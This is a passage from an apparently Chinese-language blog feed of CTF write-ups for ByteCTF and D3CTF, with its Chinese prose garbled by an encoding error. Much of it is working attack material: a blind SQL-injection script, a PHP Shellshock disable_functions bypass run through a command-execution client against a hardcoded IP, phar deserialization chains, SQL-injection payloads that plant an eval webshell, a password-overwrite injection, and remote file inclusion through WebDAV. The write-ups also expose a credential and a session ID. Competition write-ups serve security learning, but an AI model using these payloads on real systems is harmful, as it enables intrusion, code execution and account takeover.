æ•°æ®åº“å:696e666f726d6174696f6e5f736368656d612c62616279626c6f67#çŒœinformation_schemaè¡¨å#vipç”¨æˆ·:wulaxc4ca4238a0b923820dcc509a6f75849bresult=&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;index=len(result)while 1:    index+=1    temp=sql.replace(&#39;index&#39;,str(index))    for i in range(20):        print(&quot;çŒœæµ‹ç¬¬&quot;+str(index)+&quot;ä½ä¸º:&quot;+str(i))        if sql_inject(temp.replace(&#39;guess&#39;,str(i))):            result+=hex(i)[2:]            break    print(result)    res=&#39;&#39;    for i in range(0,len(result),2):        res+=chr(int(result[i:i+2],16))    print(res)</code></pre><p>filter=<code>(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(</code>|â€™|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|â€™|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>banæ‰äº†select è¯­å¥<br>å¦‚æœæ‹¿åˆ°vipæƒé™å¯ä»¥ç”¨æ›¿æ¢ç»•è¿‡<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess</code>ç»•è¿‡æ­£åˆ™è¿‡æ»¤</p><p>æ‹¿åˆ°vipè´¦å·:wulax,å¯†ç :1,ç½‘å€:<a href="http://112.126.101.16:9999" target="_blank" rel="noopener">http://112.126.101.16:9999</a></p><p>çœ‹åˆ°replace.phpé‡Œçš„preg_replace()çŒœæµ‹çªç ´ç‚¹åœ¨è¿™é‡Œ,åˆ©ç”¨<code>/e%00</code>æ¥æˆªæ–­æœ«å°¾çš„æ–œæ ,ä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><p>å‘½ä»¤æ‰§è¡Œåˆ©ç”¨è„šæœ¬:</p><pre><code class="python">import requestsurl=&quot;http://112.126.101.16:9999&quot;arc_id=&quot;11&quot;session=&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;text=&#39;&#39;&#39;&lt;?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283    $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);    $headers =  &#39;MIME-Version: 1.0&#39; . &quot;\r\n&quot;;     $headers .= &#39;From: Your name &lt;info@address.com&gt;&#39; . &quot;\r\n&quot;;    $headers .= &#39;Content-type: text/html; charset=iso-8859-1&#39; . &quot;\r\n&quot;;    putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);    // In Safe Mode, the user may only alter environment variableswhose names    // begin with the prefixes supplied by this directive.    // By default, users will only be able to set environment variablesthat    // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty,    // PHP will let the user modify ANY environment variable!    mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#39;t actuallysend any mail    $output = @file_get_contents($tmp);    @unlink($tmp);    if($output != &quot;&quot;) return $output;    else return &quot;No output, or not vuln.&quot;; } echo shellshock($_REQUEST[&quot;cmd&quot;]); ?&gt;&#39;&#39;&#39;def edit():    data={        &quot;title&quot;:&quot;bbb&quot;,        &quot;content&quot;:&quot;b&quot;,        &quot;id&quot;:arc_id    }    return requests.post(url+&quot;/edit.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})def exec(s):    data={        &quot;replace&quot;:s,#&quot;var_dump(scandir(&#39;/tmp&#39;));var_dump(file_put_contents(&#39;/tmp/aaa.php&#39;,&quot;+&quot;$_POST[&#39;cmd&#39;]&quot;+&quot;));&quot;,        &quot;regex&quot;:&quot;1&quot;,        &quot;id&quot;:arc_id,        &quot;find&quot;:&quot;b/e\x00&quot;,        &quot;cmd&quot;:&quot;ls -al&quot;,        &quot;filepath&quot;:&quot;/tmp/hpdoger.php&quot;    }    result=requests.post(url+&quot;/replace.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})    edit()    return resultwhile 1:    print(exec(input()).text)</code></pre><p>emmmm..åˆ°è¿™é‡Œå°±ä¸ä¼šåšäº†.åˆ°å¤´äº†.</p><p>åæ¥å‘ç°æœ‰ä¸ªantsystem()</p><p>vardump(antsystem(â€˜/readfileâ€™));</p><h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>å“ˆå¸Œæ‰©å±•æ”»å‡»æ‹¿åˆ°adminæƒé™</p><p>ä»£ç å®¡è®¡å‘ç°</p><p>åœ¨config.phpä¸‹</p><pre><code class="php">class File{    public $filename;    public $filepath;    public $checker;    function __construct($filename, $filepath)    {        $this-&gt;filepath = $filepath;        $this-&gt;filename = $filename;    }    function __destruct()    {        if (isset($this-&gt;checker)){            $this-&gt;checker-&gt;upload_file();        }    }    public function view_detail(){        if (preg_match(&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;, $this-&gt;filepath)){            die(&quot;nonono~&quot;);        }        $mine = mime_content_type($this-&gt;filepath);        $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);        $res[&#39;mine&#39;] = $mine;        $res[&#39;store_path&#39;] = $store_path;        return $res;    }}</code></pre><p>è¿‡æ»¤pharå¹¶ä¸”æ˜æ˜æ²¡æœ‰ç»™<code>$checker</code>èµ‹å€¼çš„ç‚¹,åœ¨é”€æ¯çš„æ—¶å€™å´ä¼šè°ƒç”¨å®ƒ,æ˜æ˜¾æ˜¯ä¸€ä¸ªä¸ºäº†å‡ºé¢˜è€Œå†™çš„åœ°æ–¹çŒœæµ‹pharååºåˆ—åŒ–åˆ©ç”¨,è€Œmime_content_type()æ°å¥½åˆæ˜¯ååºåˆ—åŒ–çš„åˆ©ç”¨ç‚¹</p><p>æœ€ååœ¨view.phpå¤„æ‰¾åˆ°è°ƒç”¨view_detailçš„åœ°æ–¹</p><p>ç”±äºé¢˜ç›®ä¸é™åˆ¶.phpæ–‡ä»¶çš„ä¸Šä¼ ,ä½†æ˜¯é¢˜ç›®ä¼šå†™ä¸€ä¸ªéæ³•.htaccess</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯ä»¥è¯•ç€åˆ é™¤å®ƒ</p><p>æ„é€ popé“¾:</p><p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p><p>pharæ–‡ä»¶ç”Ÿæˆåå°±æ˜¯è¦è€ƒè™‘å¦‚ä½•ç»•è¿‡<code>(^phar)</code>çš„é™åˆ¶,</p><p>æˆ‘è§‰å¾—è¿™æ‰æ˜¯è¿™ä¸€é¢˜æœ€éªšçš„åœ°æ–¹:</p><p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>è¿™æ¬¡æœ€å¼€å¿ƒçš„å°±æ˜¯åšmiscçš„é¢˜ç›®</p><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>å‘ç°çŒœæ‹³è§„å¾‹</p><p>è®¡ç®—æœºç¬¬ä¸€æ¬¡å‡ºä¸è¢«æ˜¾ç¤ºçš„é€‰æ‹©å…‹åˆ¶çš„é€‰æ‹©(æ˜¾ç¤º:s,å®é™…å‡º:j)</p><p>è®¡ç®—æœºç¬¬äºŒæ¬¡å‡ºä¸å…‹åˆ¶æ˜¾ç¤ºçš„é€‰æ‹©çš„é€‰æ‹©(æ˜¾ç¤º:s,å®é™…å‡º:b)</p><p>è®¡ç®—æœºç¬¬ä¸‰æ¬¡å‡ºæ˜¾ç¤ºçš„é€‰æ‹©(æ˜¾ç¤º:s,å®é™…å‡º:s)</p><p>ç„¶åæ‰‹åŠ¨pk :D</p><h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/bytectfwp/">http://blog.ccreater.top/2020/04/20/bytectfwp/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d3ctf</title>
      <link href="/2020/04/20/d3ctf2019/"/>
      <url>/2020/04/20/d3ctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="d3ctf"><a href="#d3ctf" class="headerlink" title="d3ctf"></a>d3ctf</h1><p>ç–¯ç‹‚æ¶¨å§¿åŠ¿ï¼Œå°±å¾ˆnice</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p> <a href="https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md" target="_blank" rel="noopener">https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md</a> </p><p> <a href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/</a> </p><p> <a href="https://www.anquanke.com/post/id/193939#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193939#h3-4</a> </p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g97tefki11j30ao01s743.jpg" alt="image.png"></p><p>å’Œusernameæœ‰å…³?</p><p>x  æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º:<code>*/echo 1231231231;/*</code>çš„ç”¨æˆ·</p><p>äºŒæ¬¡æ³¨å…¥,User çš„indexæ–¹æ³•è°ƒç”¨get_view</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985asdayuj30pm027dfx.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g985c901tuj30u208vmxr.jpg" alt="image.png"></p><p>åˆ©ç”¨æ›¿æ¢{æ¥ç»•è¿‡select å’Œ unionçš„è¿‡æ»¤,åˆ©ç”¨0xâ€¦.æ¥ç»•è¿‡{çš„è¿‡æ»¤</p><p>æœ€åçš„payload</p><p>æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º<code>aaa&#39; unio{n selec}t 0x7B7B7068707D7D6576616C28245F504F53545B615D293B7B7B2F7068707D7D limit 1,1#</code>æˆåŠŸæ‹¿åˆ°shellæƒé™</p><p> d3ctf{Th4atâ€™s_A_Si11y_P0p_chi4n} </p><h3 id="fakeonlinephp"><a href="#fakeonlinephp" class="headerlink" title="fakeonlinephp"></a>fakeonlinephp</h3><p>æŠ¥é”™</p><pre><code>Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1Warning: include(http://39.108.164.219:60005/1.txt): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1Warning: include(): Failed opening &#39;http://39.108.164.219:60005/1.txt&#39; for inclusion (include_path=&#39;.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;&#39;) in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1</code></pre><p>è™½ç„¶ç¦ç”¨äº†httpåè®®,ä½†æ˜¯è¿˜æ˜¯ä¼šå‘é€è¯·æ±‚</p><p>uncè·¯å¾„è¿œç¨‹æ–‡ä»¶åŒ…å«</p><p>ä¸€é”®å¯åŠ¨ä¸€ä¸ªwebdavæœåŠ¡å™¨</p><p><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</code>ç„¶åæŠŠphpæ–‡ä»¶æ”¾åˆ°/root/webdav/dataé‡Œå°±è¡Œäº†</p><p><a href="http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf" target="_blank" rel="noopener">http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf</a></p><p>eval($_COOKIE[â€˜aâ€™]);</p><p>whois</p><pre><code>Domain Name: D3CTF.IORegistry Domain ID: D503300001132938421-LRMSRegistrar WHOIS Server: whois.namesilo.comRegistrar URL: http://www.namesilo.comUpdated Date: 2019-10-14T20:31:26ZCreation Date: 2019-08-15T11:56:00ZRegistry Expiry Date: 2020-08-15T11:56:00ZRegistrar Registration Expiration Date:Registrar: Namesilo, LLCRegistrar IANA ID: 1479Registrar Abuse Contact Email: Registrar Abuse Contact Phone: +1.4805240066Reseller:Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibitedRegistrant Organization: See PrivacyGuardian.orgRegistrant State/Province: AZRegistrant Country: USName Server: DNS21.HICHINA.COMName Server: DNS22.HICHINA.COMDNSSEC: unsignedThe Registrar of Record identified in this output may have an RDDS service that can be queried for additional information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.</code></pre><pre><code>æœ¬ç«™æ•°æ®ï¼šé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒº è…¾è®¯äº‘å‚è€ƒæ•°æ®1ï¼šé¦™æ¸¯ tencent.comå‚è€ƒæ•°æ®2ï¼šç¾å›½å…¼å®¹IPv6åœ°å€ï¼š::966D:4AEAæ˜ å°„IPv6åœ°å€ï¼š::FFFF:966D:4AEA</code></pre><p>whoami</p><pre><code>whoami /allUSER INFORMATION----------------User Name        SID                                         ================ ============================================172_19_97_4\w1nd S-1-5-21-330377560-317033357-2560255023-1001GROUP INFORMATION-----------------Group Name                             Type             SID          Attributes                                        ====================================== ================ ============ ==================================================Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled groupLOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled groupMandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    </code></pre><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><pre><code class="php">&lt;?phpclass dir{    public $userdir;    public $url;    public $filename;    public function __construct($url,$filename) {        $this-&gt;userdir = &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;]);        $this-&gt;url = $url;        $this-&gt;filename  =  $filename;        if (!file_exists($this-&gt;userdir)) {            mkdir($this-&gt;userdir, 0777, true);        }    }    public function checkdir(){        if ($this-&gt;userdir != &quot;upload/&quot; . md5($_SERVER[&quot;HTTP_HOST&quot;])) {            die(&#39;hacker!!!&#39;);        }    }    public function checkurl(){        $r = parse_url($this-&gt;url);        if (!isset($r[&#39;scheme&#39;]) || preg_match(&quot;/file|php/i&quot;,$r[&#39;scheme&#39;])){            die(&#39;hacker!!!&#39;);        }    }    public function checkext(){        if (stristr($this-&gt;filename,&#39;..&#39;)){            die(&#39;hacker!!!&#39;);        }        if (stristr($this-&gt;filename,&#39;/&#39;)){            die(&#39;hacker!!!&#39;);        }        $ext = substr($this-&gt;filename, strrpos($this-&gt;filename, &quot;.&quot;) + 1);        if (preg_match(&quot;/ph/i&quot;, $ext)){            die(&#39;hacker!!!&#39;);        }    }    public function upload(){        $this-&gt;checkdir();        $this-&gt;checkurl();        $this-&gt;checkext();        $content = file_get_contents($this-&gt;url,NULL,NULL,0,2048);        if (preg_match(&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;, $content)){            die(&#39;hacker!!!&#39;);        }        file_put_contents($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename,$content);    }    public function remove(){        $this-&gt;checkdir();        $this-&gt;checkext();        if (file_exists($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename)){            unlink($this-&gt;userdir.&quot;/&quot;.$this-&gt;filename);        }    }    public function count($dir) {        if ($dir === &#39;&#39;){            $num = count(scandir($this-&gt;userdir)) - 2;        }        else {            $num = count(scandir($dir)) - 2;        }        if($num &gt; 0) {            return &quot;you have $num files&quot;;        }        else{            return &quot;you don&#39;t have file&quot;;        }    }    public function __toString() {        return implode(&quot; &quot;,scandir(__DIR__.&quot;/&quot;.$this-&gt;userdir));    }    public function __destruct() {        $string = &quot;your file in : &quot;.$this-&gt;userdir;        file_put_contents($this-&gt;filename.&quot;.txt&quot;, $string);        echo $string;    }}if (!isset($_POST[&#39;action&#39;]) || !isset($_POST[&#39;url&#39;]) || !isset($_POST[&#39;filename&#39;])){    highlight_file(__FILE__);    die();}$dir = new dir($_POST[&#39;url&#39;],$_POST[&#39;filename&#39;]);if($_POST[&#39;action&#39;] === &quot;upload&quot;) {    $dir-&gt;upload();}elseif ($_POST[&#39;action&#39;] === &quot;remove&quot;) {    $dir-&gt;remove();}elseif ($_POST[&#39;action&#39;] === &quot;count&quot;) {    if (!isset($_POST[&#39;dir&#39;])){        echo $dir-&gt;count(&#39;&#39;);    } else {        echo $dir-&gt;count($_POST[&#39;dir&#39;]);    }}</code></pre><blockquote><p>webroot in /var/www/html<br>Notice:scanner is useless<br>hint1: webroot changes every 10 mins<br>hint2: glob<br>hint3: <a href="https://www.php.net/manual/en/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/en/language.oop5.decon.php</a>  ** Pay attention to the notes in the article **</p></blockquote><h4 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><p>uploadå¤„urlå¯æ§,æ‰€ä»¥åªè¦ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶ä¾¿å¯ä»¥ååºåˆ—åŒ–</p><p>åˆ©ç”¨è¿™ä¸ªèƒ½åšåˆ°:</p><ol><li>æ‰«ç›®å½•<code>__destruct__=&gt;__toString__</code></li><li>ä»»æ„ä½ç½®å†™æ–‡ä»¶,ä½†æ˜¯å› ä¸ºä¸Šä¼ pharæ–‡ä»¶æ—¶æœ‰è¿‡æ»¤,æ‰€ä»¥æ–‡ä»¶å†…å®¹ä¹Ÿæœ‰æ‰€é™åˆ¶</li></ol><p>ä½†æ˜¯</p><p><code>phar://phar.phar.gz/test.txt</code></p><p><code>å°†pharæ–‡ä»¶å‹ç¼©åä¾¿å¯ä»¥ç»•è¿‡æ–‡ä»¶é™åˆ¶</code></p><p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥åœ¨ä»»æ„ä½ç½®å†™æ–‡ä»¶çš„æƒé™äº†</p><p>äºæ˜¯æˆ‘ä»¬æœ‰è¿™æ ·çš„æ€è·¯:åˆ©ç”¨uploadå†™ä¸€ä¸ªhtaccess,ç„¶åå†åˆ©ç”¨ååºåˆ—åŒ–å†™ä¸€ä¸ªshellã€‚</p><p>è¿™é‡Œæœ‰ä¸ªå‘ç‚¹å°±æ˜¯ï¼Œwebä¸»ç›®å½•æ¯éš”10åˆ†é’Ÿå˜åŒ–ä¸€æ¬¡,ä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¥è¯»å–webç›®å½•</p><p>æŒ‰ç…§ä¸Šè¿°æ­¥éª¤æˆåŠŸæ‹¿åˆ°shell</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmy4tnlxj30ja05mglr.jpg" alt="image.png"></p><p>è¾“å…¥phpinfo()å‘ç°,æœ‰disable_functioné‡Œç¦ç”¨äº†systemç­‰å‡½æ•°,è¿™å°±ä¸çˆ½äº†ã€‚ä½†æ˜¯phpç‰ˆæœ¬æ˜¯7.2ï¼Œä¸Šä¼ </p><p> <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a>  è¿™ä¸ªè€å…„å†™çš„ç»•è¿‡disable_functionçš„è„šæœ¬ï¼Œçˆ½æ­»äº†ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g9bmyvlo98j30ga03ywej.jpg" alt="image.png"></p><h3 id="showhub"><a href="#showhub" class="headerlink" title="showhub"></a>showhub</h3><p>é˜…è¯»ä»£ç å‘ç°</p><pre><code class="php">public function register($username, $password)    {        $password = hash(&quot;sha256&quot;, $password);        $user = (new User(null, $username, $password))-&gt;save();        if ($user) {            $_SESSION[&#39;uid&#39;] = $user-&gt;id;            return $user;        }        return false;    }public function save()    {        $args = get_object_vars($this);        $args = array_slice($args, 0, -2);        if ($args[&#39;id&#39;] !== null) {            $baseSql = &quot;UPDATE `$this-&gt;tbname` SET %s WHERE id=&quot; . $args[&#39;id&#39;];            $sql = self::prepareUpdate($baseSql, array_slice($args, 1));            $this-&gt;db-&gt;query($sql);            if (!$this-&gt;db-&gt;conn-&gt;error) {                return $this;            } else {                return null;            }        } else {            $baseSql = &quot;INSERT INTO `$this-&gt;tbname`(%s) VALUE(%s)&quot;;            $sql = self::prepareInsert($baseSql, $args);            $this-&gt;db-&gt;query($sql);            if (!$this-&gt;db-&gt;conn-&gt;error) {                $objectID = $this-&gt;db-&gt;query(&quot;SELECT LAST_INSERT_ID()&quot;)-&gt;fetch_row()[0];                return self::findOne(array(&quot;id&quot; =&gt; $objectID));            } else {                return null;            }        }    }</code></pre><p>registerè°ƒç”¨çš„saveæ–¹æ³•å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥ç»•è¿‡addslashes</p><p>æ„é€ <code>user=admin%1$&#39;,0x60)#&amp;pass=123</code></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9l4a1jb20j30l204cgls.jpg" alt="image.png"></p><p>insert çš„ä¸€ä¸ªæ–¹æ³•å¯ä»¥ä¿®æ”¹é‡å¤çš„å€¼  <code>insert on duplicate key update</code> ï¼Œå®ƒèƒ½å¤Ÿè®©æˆ‘ä»¬åœ¨æ–°æ’å…¥çš„ä¸€ä¸ªæ•°æ®å’ŒåŸæœ‰æ•°æ®å‘ç”Ÿé‡å¤æ—¶ï¼Œä¿®æ”¹åŸæœ‰æ•°æ®ã€‚é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡è¿™ä¸ªæŠ€å·§ä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ç å³å¯ã€‚ </p><p>æµ‹è¯•testç”¨æˆ·,åŸå¯†ç :123</p><p>æ„é€ <code>user=test%1$&#39;,0x60)on duplicate key update password=0x38643936396565663665636164336332396133613632393238306536383663663063336635643561383661666633636131323032306339323361646336633932#&amp;pass=123</code></p><p>æˆåŠŸå°†å¯†ç ä¿®æ”¹ä¸º123456ï¼Œå†²adminå¯†ç </p><p>æ¥ç€è¿›å…¥webconsoleå½“ä¸­,æç¤ºåªæœ‰å†…ç½‘æ‰èƒ½ä½¿ç”¨</p><p>ç›¸å…³ä»£ç </p><pre><code class="php">if ($this-&gt;request-&gt;user-&gt;username === &quot;admin&quot; &amp;&amp; !filter_var(                $_SERVER[&#39;HTTP_CLIENT_IP&#39;],                FILTER_VALIDATE_IP,                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE            ))</code></pre><p>emmmç›´æ¥ä¿®æ”¹cilent-ipå‘ç°ä¸è¡Œ</p><blockquote><p>å› ä¸ºè¿™é‡Œçš„<code>Client-IP</code>å¤´æ˜¯åä»£å±‚é¢è®¾ç½®çš„ï¼ˆset $Client-IP $remote_addrï¼‰, æ‰€ä»¥æ— æ³•é€šè¿‡å‰ç«¯ä¿®æ”¹è¯·æ±‚å¤´æ¥ä¼ªé€ ã€‚ </p><p>è¿™æ—¶å¯ä»¥ä»æœåŠ¡å™¨è¿”å›çš„<code>Server</code>å¤´ä¸­å‘ç°ï¼Œåä»£æ˜¯<code>ATS7.1.2</code> é‚£ä¹ˆåº”è¯¥å¾ˆæ•æ„Ÿçš„æƒ³åˆ°é€šè¿‡<code>HTTPèµ°ç§</code> æ¥ç»•è¿‡åä»£ï¼Œè§„é¿åä»£è®¾ç½®<code>Client-IP</code>ã€‚ </p></blockquote><p>é‚£ä¹ˆä»€ä¹ˆæ˜¯ast?</p><blockquote><p>Apache Traffic Serverâ„¢ is a high-performance web proxy cache that improves network efficiency and performance by caching frequently-accessed information at the edge of the network. This brings content physically closer to end users, while enabling faster delivery and reduced bandwidth use. Traffic Server is designed to improve content delivery for enterprises, Internet service providers (ISPs), backbone providers, and large intranets by maximizing existing and available bandwidth. </p></blockquote><p>emmmm,astæ˜¯ä¸€ä¸ªåœ¨ç”¨æˆ·å’ŒæœåŠ¡å™¨ä¹‹é—´çš„èµ·ç¼“å†²åŠ é€Ÿçš„ä»£ç†æœåŠ¡å™¨,è¿™ä¹Ÿæ­£æ˜¯httpèµ°ç§å¸¸å‡ºç°çš„åº”ç”¨åœºæ™¯</p><p><code>ATS7.1.2</code> æœ‰ä¸ªcveæ°å¥½æ˜¯å…³äºhttpèµ°ç§çš„ï¼Œç›´æ¥ç”¨å°±okäº†</p><h3 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h3><p>emmm,ctfçš„å¼¥å¤©å¤§è°</p><pre><code class="python">from flask import Flask, render_template_string, session, request, make_responseimport hashlibimport osimport jsonfrom rq import Queuefrom redis import Redisapp = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = &#39;somesecret&#39;config = json.load(open(&#39;config.json&#39;, &#39;r&#39;))def verify_url(url):    base = &#39;https://&#39;+request.host    if len(url) == 0:        return False    if len(url) &lt; len(base) or url[:len(base)] != base:        return False    return Truedef verify_captcha(captcha):    return &#39;captcha&#39; in session.keys() \        and len(session.get(&#39;captcha&#39;)) == 5 \        and hashlib.md5(captcha.encode()).hexdigest()[:5] == session.get(&#39;captcha&#39;)def add_queue(url):    q = Queue(connection=Redis(        host=config[&#39;redis&#39;][&#39;host&#39;],        password=config[&#39;redis&#39;][&#39;auth&#39;]    ))    q.enqueue(&#39;bot.add&#39;, url)@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])@app.route(&#39;/index.php&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def index():    message = &quot;&quot;    if request.method == &#39;POST&#39;:        try:            if &#39;captcha&#39; in request.form.keys() and &#39;url&#39; in request.form.keys():                captcha = request.form[&#39;captcha&#39;]                url = request.form[&#39;url&#39;]                if not verify_captcha(captcha):                    message = &quot;Wrong Captcha :(&quot;                elif not verify_url(url):                    message = &quot;Wrong URL :(&quot;                else:                    session.pop(&#39;captcha&#39;)                    message = &quot;Done! Please wait for the admin to check it out. XD&quot;                    add_queue(url)        except:            message = &quot;Error! Please contact admin&quot;    if &#39;captcha&#39; not in request.form.keys() or &#39;captcha&#39; not in session.keys():        session[&#39;captcha&#39;] = hashlib.md5(os.urandom(16)).hexdigest()[:5]    return render_template_string(     